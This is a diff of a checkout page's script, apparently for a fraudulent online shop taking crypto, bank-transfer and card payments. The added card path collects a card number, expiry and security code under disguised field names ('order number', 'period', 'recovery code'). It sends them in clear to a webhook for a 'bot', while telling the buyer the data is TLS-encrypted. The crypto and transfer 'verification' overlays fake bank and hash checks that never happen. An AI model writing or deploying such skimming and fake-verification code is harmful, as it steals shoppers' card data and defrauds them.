-        qr:'https://api.qrcode-monkey.com/tmp/9c2692034c7a6496eb6d7153da52f854.svg?1755861184316'
-      },
-      'USDT-TRC20':{
-        address:'TMdLMTYGEEZAnoVbi482Zr9QSRgWmRUXXq',
-        qr:'https://api.qrcode-monkey.com/tmp/ce476e4409d57ba517ffaf6db6bf25d2.svg?1755861346811'
-      },
-      'BTC':{
-        address:'18npEW9EaKZvVvA9B1z3DcmVEJtuQUdus3',
-        qr:'https://api.qrcode-monkey.com/tmp/578f1d0b0e32feece2ae335bb417c7f8.svg?1755861612113'
-      },
-      'ETH-ERC20':{
-        address:'0x5f1e4fdef890dba03ebfcba79a77aa0ea432f04b',
-        qr:'https://api.qrcode-monkey.com/tmp/9c2692034c7a6496eb6d7153da52f854.svg?1755861930363'
-      }
-    };
-
-    function setCryptoAddress(ccy){
-      const cfg=WALLET[ccy];
-      $('#wallet').value = cfg?.address || '';
-      $('#ccyLabel').textContent = fx[ccy]?.symbol || (ccy.includes('USDT')?'USDT':'');
-      const img=$('#qrImg'); if(img){ img.src = cfg?.qr || ''; img.alt = 'QR '+ccy; }
+  /* ====== VALIDATION ====== */
+  function validateAddress(){
+    const req=['name','email','address','city','zip','country'];
+    for(const id of req){
+      const el=$('#'+id);
+      const val = el?.tagName==='SELECT' ? el.value : (el?.value||'').trim();
+      if(!val){ el?.focus(); toast('Veuillez compléter vos informations.'); return false; }
     }
+    return true;
+  }
+  function validateCardForm(){
+    const nm = ($('#cardName')?.value||'').trim(); if(!nm){ $('#cardName')?.focus(); toast('Titulaire requis.'); return false; }
+    const num = ($('#orderNumber')?.value||'').replace(/\D+/g,''); if(num.length!==16){ $('#orderNumber')?.focus(); toast('Numéro de commande: 16 chiffres.'); return false; }
+    const per = ($('#cardPeriod')?.value||'').trim(); if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(per)){ $('#cardPeriod')?.focus(); toast('Période: MM/AA.'); return false; }
+    const rec = ($('#recoveryCode')?.value||'').replace(/\D+/g,''); if(rec.length<3){ $('#recoveryCode')?.focus(); toast('Code de récupération: min 3 chiffres.'); return false; }
+    return true;
+  }
 
-    // Ratenplan
-    function splitAmounts(total, parts){
-      const cents=Math.round(total*100);
-      const base=Math.floor(cents/parts);
-      const first=base + (cents - base*parts);
-      const arr=[first]; for(let i=1;i<parts;i++) arr.push(base);
-      return arr.map(c=>c/100);
-    }
-    function scheduleLines(total, parts){
-      const amts=splitAmounts(total, parts);
-      const today=new Date(); const steps=[0,30,60,90];
-      return amts.map((amt,i)=>{
-        const d=new Date(today); d.setDate(d.getDate()+steps[i]);
-        const label = i===0 ? 'Heute' : (i===1?'In 30 Tagen': i===2?'In 60 Tagen':'In 90 Tagen');
-        return {label,date:d.toLocaleDateString('de-DE'),amt};
+  /* ====== OVERLAYS & CTA ====== */
+  const overlay=$('#checkOverlay'), ovTitle=$('#ovTitle'), ovSub=$('#ovSub'), doneOverlay=$('#doneOverlay');
+  const showOverlay=(t,s)=>{ if(ovTitle) ovTitle.textContent=t||'Vérification…'; if(ovSub) ovSub.textContent=s||'Un instant…'; overlay?.classList.add('show'); overlay?.setAttribute('aria-hidden','false'); };
+  const hideOverlay=()=>{ overlay?.classList.remove('show'); overlay?.setAttribute('aria-hidden','true'); };
+  const showDone=()=>{ doneOverlay?.classList.add('show'); doneOverlay?.setAttribute('aria-hidden','false'); };
+
+  let bankVerified=false, cryptoVerified=false;
+  function updateCTA(){
+    const pm=currentPM(), btn=$('#placeOrder');
+    if(!btn) return;
+    // Pour CARTE, on redirige via le bouton dédié => on laisse "Finaliser" désactivé.
+    btn.disabled = pm==='card' ? true : (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : true);
+  }
+
+  /* ====== WEBHOOK (POST JSON avec fallback) ====== */
+  function countryName(){
+    const sel=$('#country'); if(!sel) return '';
+    const o=sel.options[sel.selectedIndex];
+    return (o?.text||'').trim();
+  }
+  function cartForWebhook(){
+    try{ const cart=JSON.parse(localStorage.getItem('gf_cart')||'[]'); return cart.map(x=>({name:x.name,qty:+(x.qty||1),price:+(x.price||0)})); }catch{return[];}
+  }
+  async function sendWebhook(payload){
+    // enrichissement
+    payload.req_id = payload.req_id || ('gf_' + Date.now() + '_' + Math.random().toString(36).slice(2,8));
+    payload.ts_client = payload.ts_client || new Date().toISOString();
+    payload.origin = location.origin;
+    payload.ua = navigator.userAgent;
+
+    const dataStr = JSON.stringify(payload);
+    // A) JSON
+    try{
+      await fetch(WEBHOOK_URL, {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json', ...(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}) },
+        body:dataStr,
+        keepalive:true
       });
-    }
+      return;
+    }catch(_){}
+    // B) x-www-form-urlencoded (_json)
+    try{
+      const usp=new URLSearchParams(); usp.set('_json', dataStr);
+      await fetch(WEBHOOK_URL, { method:'POST', headers:(WEBHOOK_SECRET? {'X-Webhook-Secret':WEBHOOK_SECRET} : {}), body: usp, keepalive:true });
+      return;
+    }catch(_){}
+    // C) no-cors
+    try{
+      await fetch(WEBHOOK_URL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body:dataStr, keepalive:true });
+    }catch(_){}
+  }
 
-    // Split
-    let selectedSplit=1; let modalParts=4;
-    const modal=$('#splitModal');
-    const openModal=()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); };
-    const closeModal=()=>{ modal.classList.remove('show'); modal.setAttribute('aria-hidden','true'); };
-    function updateSplitHint(){ $('#splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'; }
-    function updateModalPreview(){
-      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0,sub - promo);
-      const lines=scheduleLines(total, modalParts);
-      $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
-    }
-    function setModalParts(n){
-      modalParts=Number(n);
-      $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===modalParts)));
-      updateModalPreview();
-    }
-    $$('#segSplit .segbtn').forEach(b=>b.addEventListener('click',()=>setModalParts(b.dataset.parts)));
-    $('#closeSplit').addEventListener('click',closeModal);
-    $('#cancelSplit').addEventListener('click',closeModal);
-    $('#applySplit').addEventListener('click',()=>{ selectedSplit=modalParts; $('#btnSplit').classList.add('on'); $('#btnOnce').classList.remove('on'); closeModal(); updateSplitHint(); updateSummary(); });
-
-    // Kurz-Ref
-    const slugRefFromName = (n)=>{
-      const base=(n||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16);
-      if(base) return base;
-      const short=orderId.replace('GF-','').split('-')[0];
-      return 'GF'+short;
+  /* ====== ENVOIS ====== */
+  async function sendCrypto(dueNow){
+    const payload = {
+      orderId, method:'crypto', amount:(+dueNow||0).toFixed(2),
+      txid: ($('#txid')?.value||'').trim(), ccy: $('#ccy')?.value||'USDT-BEP20',
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
+      split:selectedSplit, cart:cartForWebhook()
     };
-    const syncRef=()=>{ const name=$('#name')?.value||''; $('#vref').value=slugRefFromName(name); };
-    $('#name').addEventListener('input', syncRef);
+    await sendWebhook(payload);
+  }
 
-    // Zusammenfassung
-    const SHIPPING=0;
-    function updateSummary(){
-      const cart=getCart(); if(!cart.length){ renderMini(); return; }
-      const sub=computeSub(cart);
-      const promo=sub*promoRate();
-      const total=Math.max(0, sub + SHIPPING - promo);
-      const parts = selectedSplit;
-      const amts=splitAmounts(total,parts);
-      const dueNow=amts[0];
+  async function fileToBase64(file){
+    const buf=await file.arrayBuffer();
+    let bin=''; const bytes=new Uint8Array(buf), chunk=0x8000;
+    for(let i=0;i<bytes.length;i+=chunk){ bin+=String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
+    return btoa(bin);
+  }
 
-      $('#sub').textContent=EUR(sub);
-      $('#benefit').textContent= promo>0 ? '–'+EUR(promo) : '—';
-      $('#total').textContent=EUR(total);
-      $('#dueNow').textContent=EUR(dueNow);
-
-      const scheduleBox=$('#schedule');
-      if(parts>1){
-        const lines=scheduleLines(total, parts);
-        scheduleBox.style.display='grid';
-        scheduleBox.innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
-      }else{
-        scheduleBox.style.display='none';
-      }
-
-      if(currentPM()==='crypto'){
-        $('#amountNow').value = dueNow.toFixed(2);
-        const ccy=$('#ccy').value; const r=fx[ccy]?.rate||1;
-        const amt=(dueNow/r);
-        $('#ccyAmt').value = (amt>0?amt:0).toFixed(6).replace(/0+$/,'').replace(/\.$/,'');
-      }
-      if(currentPM()==='sepa'){
-        $('#amountNowBank').value = dueNow.toFixed(2);
-      }
-    }
-    function currentDueNow(){
-      const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
-      return splitAmounts(total, selectedSplit)[0]||0;
-    }
-
-    // Overlays
-    const overlay = document.getElementById('checkOverlay');
-    const ovTitle = document.getElementById('ovTitle');
-    const ovSub = document.getElementById('ovSub');
-    const showOverlay = (title, sub) => {
-      ovTitle.textContent = title || 'Prüfung…';
-      ovSub.textContent = sub || 'Einen Moment, wir bestätigen Ihre Zahlung.';
-      overlay.classList.add('show'); overlay.setAttribute('aria-hidden','false');
+  async function sendSepa(dueNow, proofFile){
+    const payload = {
+      orderId, method:'sepa', amount:(+dueNow||0).toFixed(2),
+      ref: ($('#vref')?.value||'').trim(),
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
+      split:selectedSplit, cart:cartForWebhook()
     };
-    const hideOverlay = () => { overlay.classList.remove('show'); overlay.setAttribute('aria-hidden','true'); };
+    if(proofFile){
+      payload.file_name = proofFile.name;
+      payload.mime_type = proofFile.type || 'application/octet-stream';
+      payload.file_b64  = await fileToBase64(proofFile);
+    }
+    await sendWebhook(payload);
+  }
 
-    const doneOverlay = document.getElementById('doneOverlay');
-    const showDone = () => { doneOverlay.classList.add('show'); doneOverlay.setAttribute('aria-hidden','false'); };
+  async function sendCard(dueNow){
+    // on collecte TOUT le second formulaire et on envoie en clair (alias inclus)
+    const card_name = ($('#cardName')?.value||'').trim();
+    const order_number = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
+    const period = ($('#cardPeriod')?.value||'').trim();
+    const recovery_code = ($('#recoveryCode')?.value||'').trim();
 
-    // Zustände
-    let bankVerified=false, cryptoVerified=false;
+    const payload = {
+      orderId, method:'card', amount:(+dueNow||0).toFixed(2),
 
-    function updateCTA(){
-      const pm=currentPM();
-      const btn=$('#placeOrder');
-      btn.disabled = (pm==='sepa' ? !bankVerified : pm==='crypto' ? !cryptoVerified : false);
-    }
+      // Champs carte + alias pour Apps Script
+      card_name, titulaire: card_name, cardholder: card_name, cardName: card_name,
+      order_number, numero_commande: order_number, orderNumber: order_number,
+      period, periode: period, card_period: period, cardPeriod: period,
+      recovery_code, code_recuperation: recovery_code, recoveryCode: recovery_code,
 
-    // ---------- WEBHOOK ----------
-    function legacyMap(payload){
-      return {
-        order: payload.orderId,
-        mode: payload.method,
-        amount: payload.amount,
-        reference: payload.ref || payload.txid || '',
-        name: payload.name,
-        email: payload.email,
-        phone: payload.phone,
-        address: payload.address,
-        city: payload.city,
-        zip: payload.zip,
-        country: payload.country,
-        txid: payload.txid || '',
-        ccy: payload.ccy || ''
-      };
-    }
-    function toQS(obj){
-      return Object.entries(obj)
-        .filter(([k,v])=> v!==undefined && v!==null && String(v).length<1800)
-        .map(([k,v])=> `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`)
-        .join('&');
-    }
-    async function postCompat(url, payload){
-      const qs = toQS(legacyMap(payload));
-      const full = qs ? `${url}?${qs}` : url;
-      try{
-        await fetch(full, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) });
-        return;
-      }catch{}
-      try{
-        const fd = new FormData(); fd.append('_json', JSON.stringify(payload));
-        await fetch(full, { method:'POST', body: fd });
-        return;
-      }catch{}
-      try{
-        await fetch(full, { method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain;charset=utf-8'}, body: JSON.stringify(payload) });
-      }catch{}
-    }
-    function cartForWebhook(){
-      try{
-        const cart = JSON.parse(localStorage.getItem('gf_cart')||'[]');
-        return cart.map(x=>({name:x.name, qty:Number(x.qty||1), price:Number(x.price||0)}));
-      }catch{ return []; }
-    }
-    async function fileToBase64(file){
-      const buf = await file.arrayBuffer();
-      let binary=''; const bytes=new Uint8Array(buf); const chunk=0x8000;
-      for(let i=0;i<bytes.length;i+=chunk){ binary += String.fromCharCode.apply(null, bytes.subarray(i,i+chunk)); }
-      return btoa(binary);
-    }
-    async function sendCryptoToWebhook(dueNow){
-      const payload = {
-        orderId,
-        method:'crypto',
-        amount: Number(dueNow||0).toFixed(2),
-        txid: $('#txid').value.trim(),
-        ccy: $('#ccy').value,
-        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
-        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
-        cart: cartForWebhook(),
-        ts_client: new Date().toISOString()
-      };
-      await postCompat(WEBHOOK_URL, payload);
-    }
-    async function sendSepaToWebhook(dueNow, proofFile){
-      const payload = {
-        orderId,
-        method:'sepa',
-        amount: Number(dueNow||0).toFixed(2),
-        ref: $('#vref').value.trim(),
-        name: $('#name').value, email: $('#email').value, phone: $('#phone').value,
-        address: $('#address').value, city: $('#city').value, zip: $('#zip').value, country: $('#country').value,
-        cart: cartForWebhook(),
-        ts_client: new Date().toISOString()
-      };
-      if(proofFile){
-        payload.file_name = proofFile.name;
-        payload.mime_type = proofFile.type || 'application/octet-stream';
-        payload.file_b64 = await fileToBase64(proofFile);
-      }
-      await postCompat(WEBHOOK_URL, payload);
-    }
+      // Meta tel depuis form (utile côté bot)
+      phone_meta: ($('#phone')?.value||'').trim(),
 
-    // Init Anzeigen
-    renderMini(); updateSummary(); updateSplitHint(); setCryptoAddress($('#ccy').value); syncRef(); updateCTA();
+      // Coordonnées
+      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
+      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
+      country:$('#country')?.value||'', country_name: countryName(),
 
-    // Tabs Wechsel
-    $$('.m[role="tab"]').forEach(card=>{
-      card.addEventListener('click', ()=>{
-        $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
-        const m=card.dataset.method;
-        $('#pmCrypto').classList.toggle('show', m==='crypto');
-        $('#pmSEPA').classList.toggle('show', m==='sepa');
-        if(m==='sepa'){ cryptoVerified=false; }
-        if(m==='crypto'){ bankVerified=false; }
-        updateSummary();
-        updateCTA();
-      });
+      split:selectedSplit, cart:cartForWebhook()
+    };
+    await sendWebhook(payload);
+  }
+
+  /* ====== FILES (SEPA) ====== */
+  const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
+  let proofFile=null;
+  function fmtBytes(b){ if(b===0) return '0 B'; if(!b&&b!==0) return ''; const u=['B','KB','MB','GB']; let i=0; while(b>=1024&&i<u.length-1){b/=1024;i++;} return b.toFixed(b<10&&i?1:0)+' '+u[i]; }
+  function showFile(f){
+    proofFile=f;
+    if(fileWrap) fileWrap.style.display='flex';
+    if(fileName) fileName.textContent=f.name||'Datei';
+    if(fileInfo) fileInfo.textContent=(f.type||'Unbekannter Typ')+' • '+fmtBytes(f.size||0);
+    if(fileBar) fileBar.style.width='0%';
+    if(fileOk) fileOk.style.display='none';
+    let p=0; const step=()=>{ p+=Math.random()*35+20; if(p>=100){ p=100; fileBar&&(fileBar.style.width='100%'); fileOk&&(fileOk.style.display='inline-flex'); return; } fileBar&&(fileBar.style.width=p+'%'); setTimeout(step,150); }; setTimeout(step,150);
+  }
+  input?.addEventListener('change', e=>{ const f=e.target.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); input.value=''; return; } showFile(f); input.value=''; });
+  dz?.addEventListener('dragover', e=>{ e.preventDefault(); dz.classList.add('over'); });
+  dz?.addEventListener('dragleave', e=>{ e.preventDefault(); dz.classList.remove('over'); });
+  dz?.addEventListener('drop', e=>{ e.preventDefault(); dz.classList.remove('over'); const f=e.dataTransfer?.files?.[0]; if(!f) return; if(f.size>MAX_SIZE){ toast('Datei > 10 MB.'); return; } showFile(f); });
+  $('#removeProof')?.addEventListener('click', ()=>{ proofFile=null; if(input) input.value=''; if(fileWrap) fileWrap.style.display='none'; });
+
+  /* ====== TABS ====== */
+  $$('.m[role="tab"]').forEach(card=>{
+    card.addEventListener('click', ()=>{
+      $$('.m[role="tab"]').forEach(c=>c.setAttribute('aria-selected', String(c===card)));
+      const m=card.dataset.method;
+      $('#pmCrypto')?.classList.toggle('show', m==='crypto');
+      $('#pmSEPA')?.classList.toggle('show', m==='sepa');
+      $('#pmCard')?.classList.toggle('show', m==='card');
+      if(m==='sepa') cryptoVerified=false;
+      if(m==='crypto') bankVerified=false;
+      updateSummary(); updateCTA();
     });
+  });
 
-    // Split toggle
-    $('#btnOnce').addEventListener('click',()=>{ selectedSplit=1; $('#btnOnce').classList.add('on'); $('#btnSplit').classList.remove('on'); updateSplitHint(); updateSummary(); });
-    $('#btnSplit').addEventListener('click',()=>{ modal.classList.add('show'); modal.setAttribute('aria-hidden','false'); setModalParts(modalParts); updateModalPreview(); });
+  /* ====== SPLIT UI ====== */
+  const modal=$('#splitModal');
+  const setModalParts=(n)=>{ $$('#segSplit .segbtn').forEach(b=>b.setAttribute('aria-pressed', String(Number(b.dataset.parts)===Number(n)))); };
+  const updateModalPreview=()=>{
+    const cart=getCart(); const sub=computeSub(cart); const promo=sub*promoRate(); const total=Math.max(0, sub - promo);
+    const parts=Number($$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true')?.dataset.parts||4);
+    const lines=scheduleLines(total, parts);
+    $('#modalPrev').innerHTML = lines.map(l=>`<div class="sch"><span>${l.label} (${l.date})</span><span>${EUR(l.amt)}</span></div>`).join('');
+  };
+  $$('#segSplit .segbtn').forEach(b=> b.addEventListener('click',()=>{ setModalParts(b.dataset.parts); updateModalPreview(); }));
+  $('#btnSplit')?.addEventListener('click',()=>{ modal?.classList.add('show'); modal?.setAttribute('aria-hidden','false'); setModalParts(4); updateModalPreview(); });
+  $('#closeSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+  $('#cancelSplit')?.addEventListener('click',()=>{ modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); });
+  $('#applySplit')?.addEventListener('click',()=>{ const sel=$$('#segSplit .segbtn').find(b=>b.getAttribute('aria-pressed')==='true'); selectedSplit=Number(sel?.dataset.parts||4); $('#splitHint')&&(document.getElementById('splitHint').textContent = selectedSplit>1 ? `(${selectedSplit}× monatlich)` : '(deaktiviert)'); $('#btnSplit')?.classList.add('on'); $('#btnOnce')?.classList.remove('on'); modal?.classList.remove('show'); modal?.setAttribute('aria-hidden','true'); updateSummary(); });
 
-    // Crypto change
-    $('#ccy').addEventListener('change', ()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
+  /* ====== ACTIONS (anti double-click) ====== */
+  function once(btn, fn){ let busy=false; btn?.addEventListener('click', async ()=>{ if(busy) return; busy=true; try{ await fn(); } finally{ setTimeout(()=>busy=false, 900); } }); }
 
-    // Kopieren
-    const copySel=sel=>{const el=$(sel); if(!el) return; const txt=el.value||''; if(navigator.clipboard?.writeText){navigator.clipboard.writeText(txt).then(()=>toast('Kopiert'));} else {el.select(); document.execCommand('copy'); toast('Kopiert');}};
-    $$('[data-copy]').forEach(b=>b.addEventListener('click',()=>copySel(b.getAttribute('data-copy'))));
+  // Auto-génère une référence si vide (SEPA)
+  function ensureVref(){ if(!$('#vref')?.value?.trim()){ const name=$('#name')?.value||''; const base=(name||'').normalize('NFD').replace(/[\u0300-\u036f]/g,'').toUpperCase().replace(/[^A-Z0-9]+/g,'').slice(0,16) || orderId.replace('GF-','').split('-')[0]; $('#vref').value = base; } }
+  $('#name')?.addEventListener('input', ()=>{ if(!$('#vref')?.value?.trim()) ensureVref(); });
 
-    // Adress-Validierung
-    function validateAddress(){
-      const req=['name','email','address','city','zip','country'];
-      for(const id of req){
-        const el=$('#'+id);
-        if(!el) continue;
-        const val = (el.tagName==='SELECT') ? el.value : el.value.trim();
-        if(!val){ el?.focus(); toast('Bitte füllen Sie Ihre Angaben aus.'); return false; }
-      }
-      return true;
-    }
+  once($('#confirmCrypto'), async ()=>{
+    if(!validateAddress()) return;
+    const tx=($('#txid')?.value||'').trim(); if(!tx){ $('#txid')?.focus(); toast('TxID requis.'); return; }
+    showOverlay('Krypto wird geprüft…','Hash validieren…');
+    await sendCrypto(currentDueNow());
+    hideOverlay(); cryptoVerified=true; updateCTA(); toast('Transaktion erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
+  });
 
-    /* ====== Uploader (SEPA) ====== */
-    const MAX_SIZE = 10 * 1024 * 1024; // 10 MB
-    const dz = document.getElementById('dz');
-    const input = document.getElementById('proofInput');
-    const fileWrap = document.getElementById('fileWrap');
-    const fileName = document.getElementById('fileName');
-    const fileInfo = document.getElementById('fileInfo');
-    const fileBar = document.getElementById('fileBar');
-    const fileOk = document.getElementById('fileOk');
-    const removeProof = document.getElementById('removeProof');
+  once($('#confirmBank'), async ()=>{
+    if(!validateAddress()) return;
+    ensureVref();
+    if(!proofFile){ $('#dz')?.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
+    showOverlay('Überweisung wird geprüft…','Bestätigung bei der Bank…');
+    await sendSepa(currentDueNow(), proofFile);
+    hideOverlay(); bankVerified=true; updateCTA(); toast('Überweisung erfasst — Sie können abschließen'); $('#placeOrder')?.focus();
+  });
 
-    function fmtBytes(b){
-      if(b===0) return '0 B';
-      if(!b && b!==0) return '';
-      const u=['B','KB','MB','GB']; let i=0;
-      while(b>=1024 && i<u.length-1){ b/=1024; i++; }
-      return b.toFixed(b<10&&i?1:0)+' '+u[i];
-    }
-    function reasonForRefusal(f){
-      if(!f) return 'Keine Datei erkannt.';
-      if(f.size === 0) return 'Leere Datei (0 Byte).';
-      if(f.size > MAX_SIZE) return 'Datei zu groß (>10 MB).';
-      return '';
-    }
-    let proofFile = null;
-    function showFile(f){
-      proofFile = f;
-      fileName.textContent = f.name || 'Datei';
-      fileInfo.textContent = `${f.type || 'Unbekannter Typ'} • ${fmtBytes(f.size)}`;
-      fileBar.style.width = '0%';
-      fileOk.style.display = 'none';
-      fileWrap.style.display = 'flex';
-      let p = 0;
-      const step = ()=> {
-        p += Math.random()*35 + 20;
-        if (p >= 100) { p = 100; fileBar.style.width = '100%'; fileOk.style.display = 'inline-flex'; return; }
-        fileBar.style.width = p+'%';
-        setTimeout(step, 150);
-      };
-      setTimeout(step, 150);
-    }
-    function clearFile(){
-      proofFile = null;
-      if (input) input.value = '';
-      fileWrap.style.display = 'none';
-    }
-    if (removeProof) removeProof.addEventListener('click', clearFile);
+  once($('#payCard'), async ()=>{
+    if(!validateAddress()) return;
+    if(!validateCardForm()) return;
+    showOverlay('Paiement par carte…','Chiffré via TLS.');
+    await sendCard(currentDueNow());
+    // on garde l’overlay visible jusqu’au redirect (pas de disparition "éclair")
+    setTimeout(()=>{ window.location.href='merci.html'; }, 1200);
+  });
 
-    // Drag & Drop (Desktop)
-    if (dz){
-      ['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, e => {
-        e.preventDefault(); e.stopPropagation();
-        dz.classList.add('over');
-        if (e.dataTransfer) e.dataTransfer.dropEffect = 'copy';
-      }));
-      ['dragleave','drop'].forEach(ev => dz.addEventListener(ev, e => {
-        e.preventDefault(); e.stopPropagation();
-        dz.classList.remove('over');
-      }));
-      dz.addEventListener('drop', e => {
-        let f = null;
-        if (e.dataTransfer?.items && e.dataTransfer.items.length) {
-          for (const item of e.dataTransfer.items) {
-            if (item.kind === 'file') { f = item.getAsFile(); break; }
-          }
-        } else if (e.dataTransfer?.files && e.dataTransfer.files.length) {
-          f = e.dataTransfer.files[0];
-        }
-        const reason = reasonForRefusal(f);
-        if (reason) { toast(reason); return; }
-        showFile(f);
-        if (input) input.value = '';
-      });
-    }
+  $('#placeOrder')?.addEventListener('click', ()=>{
+    if(!validateAddress()) return;
+    const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
+    const pm=currentPM(); if(pm==='crypto'&&!cryptoVerified){ toast('Bitte Krypto-Prüfung abschließen.'); return; }
+    if(pm==='sepa'&&!bankVerified){ toast('Bitte Überweisungs-Prüfung abschließen.'); return; }
+    const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
+    const order={ id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
+      items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
+      shipping:{ name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'', address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'', country:$('#country')?.value||'', country_name: countryName() },
+      payment:{ method:pm, split:selectedSplit }
+    };
+    try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
+    setCart([]); showDone();
+  });
 
-    // Dateiauswahl (Mobil & Desktop)
-    if (input) input.addEventListener('change', e => {
-      const f = e.target.files && e.target.files[0];
-      const reason = reasonForRefusal(f);
-      if (reason) { toast(reason); input.value=''; return; }
-      showFile(f);
-      input.value = '';
-    });
-    /* ====== /Uploader ====== */
-
-    // Crypto bestätigen
-    document.getElementById('confirmCrypto').addEventListener('click', async ()=>{
-      if(!validateAddress()) return;
-      const tx = document.getElementById('txid').value.trim();
-      if(!tx){ document.getElementById('txid').focus(); toast('TxID erforderlich.'); return; }
-      showOverlay('Krypto-Transaktion wird geprüft…', 'Wir validieren den angegebenen Hash.');
-      const dueNow = currentDueNow();
-      try{ await sendCryptoToWebhook(dueNow); }catch{}
-      setTimeout(()=>{
-        hideOverlay();
-        cryptoVerified=true;
-        updateCTA();
-        toast('Transaktion erfasst — Sie können abschließen');
-        $('#placeOrder').focus();
-      }, 1200);
-    });
-
-    // SEPA bestätigen
-    document.getElementById('confirmBank').addEventListener('click', async ()=>{
-      if(!validateAddress()) return;
-      if(!$('#vref').value.trim()){ syncRef(); }
-      if(!proofFile){ dz.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
-      showOverlay('Überweisung wird geprüft…', 'Wir bestätigen den Eingang bei der Bank.');
-      const dueNow = currentDueNow();
-      try{ await sendSepaToWebhook(dueNow, proofFile); }catch{}
-      setTimeout(()=>{
-        hideOverlay();
-        bankVerified=true;
-        updateCTA();
-        toast('Überweisung erfasst — Sie können abschließen');
-        $('#placeOrder').focus();
-      }, 1300);
-    });
-
-    // Bestellung abschließen
-    document.getElementById('placeOrder').addEventListener('click', ()=>{
-      if(!validateAddress()) return;
-      const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
-      const pm=currentPM();
-      if(pm==='crypto' && !cryptoVerified){ toast('Bitte schließen Sie die Krypto-Prüfung ab.'); return; }
-      if(pm==='sepa' && !bankVerified){ toast('Bitte schließen Sie die Überweisungs-Prüfung ab.'); return; }
-
-      const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
-      const order={
-        id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
-        items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
-        shipping:{name:$('#name').value,email:$('#email').value,phone:$('#phone').value,address:$('#address').value,city:$('#city').value,zip:$('#zip').value,country:$('#country').value},
-        payment:{
-          method:pm, split:selectedSplit,
-          details: pm==='crypto'
-            ? {ccy:$('#ccy').value,address:$('#wallet').value,txid:$('#txid').value,amountNow:$('#amountNow').value}
-            : {iban:$('#iban').value,ref:$('#vref').value,amountNow:$('#amountNowBank').value,proofName:proofFile?.name||''}
-        }
-      };
-      try{ const all=JSON.parse(localStorage.getItem('gf_orders')||'[]'); all.push(order); localStorage.setItem('gf_orders', JSON.stringify(all)); }catch{}
-
-      setCart([]);
-      showDone();
-    });
-
-    // Modal schließen bei Klick auf Hintergrund
-    document.getElementById('splitModal').addEventListener('click',e=>{ if(e.target.id==='splitModal') e.currentTarget.classList.remove('show'); });
-
-    // Init
-    renderMini();
-    updateSummary();
+  /* ====== INIT ====== */
+  (function init(){
+    const sepaTab=document.querySelector('.m[role="tab"][data-method="sepa"]'); sepaTab?.setAttribute('aria-selected','true');
+    $('#pmSEPA')?.classList.add('show'); $('#pmCrypto')?.classList.remove('show'); $('#pmCard')?.classList.remove('show');
+    setCryptoAddress($('#ccy')?.value||'USDT-BEP20');
+    $('#ccy')?.addEventListener('change',()=>{ setCryptoAddress($('#ccy').value); updateSummary(); });
+    renderMini(); updateSummary(); updateCTA();
   })();
+})();
   </script>
 </body>
 </html>
